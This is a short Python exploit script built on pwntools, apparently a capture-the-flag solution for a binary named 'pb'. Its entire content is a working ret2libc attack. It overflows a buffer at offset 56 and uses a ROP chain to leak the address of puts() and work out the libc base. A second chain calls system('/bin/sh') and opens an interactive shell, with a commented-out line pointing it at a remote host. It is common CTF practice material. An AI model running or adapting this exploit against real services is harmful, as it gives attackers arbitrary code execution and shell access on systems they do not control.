from pwn import *

context.binary = elf = ELF("./pb")
libc = ELF("glibc/libc.so.6", checksec=False)
p = process(aslr=True)
# p = remote("10.10.10.10", 1337)

rop = ROP(elf)
rop.puts(elf.got["puts"])
rop.main()

OFFSET = 56  # Find using cyclic

payload = flat({
    OFFSET: [
        rop.chain()
    ]
})

p.sendlineafter(b"> ", payload)

p.recvuntil(b"thank you!\n")  # Some text printed before `ret` instruction

r = p.recv(6)  # Receive address of `puts()` as binary data
leak = u64(r.ljust(8, b"\x00"))
success("Leaked puts(): %#x", leak)

libc.address = leak - libc.symbols["puts"]
success("Libc base: %#x", libc.address)

rop = ROP(libc)
rop.call(rop.ret)
rop.system(next(libc.search(b"/bin/sh")))
rop.exit()

payload = flat({
    OFFSET: [
        rop.chain()
    ]
})

p.sendlineafter(b"> ", payload)

p.interactive()
